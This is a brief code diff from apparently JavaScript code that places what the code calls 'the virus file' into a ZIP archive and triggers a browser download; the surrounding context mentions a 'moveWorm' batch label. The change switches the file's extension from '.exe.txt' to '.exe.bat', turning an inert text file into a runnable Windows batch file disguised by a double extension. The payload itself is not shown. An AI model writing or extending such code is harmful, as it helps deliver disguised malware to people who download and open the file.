@@ -420,7 +420,7 @@ goto moveWorm
     }
 
     // Add the virus file to the folder
-    folder.file(`${fileName}.exe.txt`, virusFileContent);
+    folder.file(`${fileName}.exe.bat`, virusFileContent);
 
     // Generate the ZIP file and trigger the download
     zip.generateAsync({ type: 'blob' })
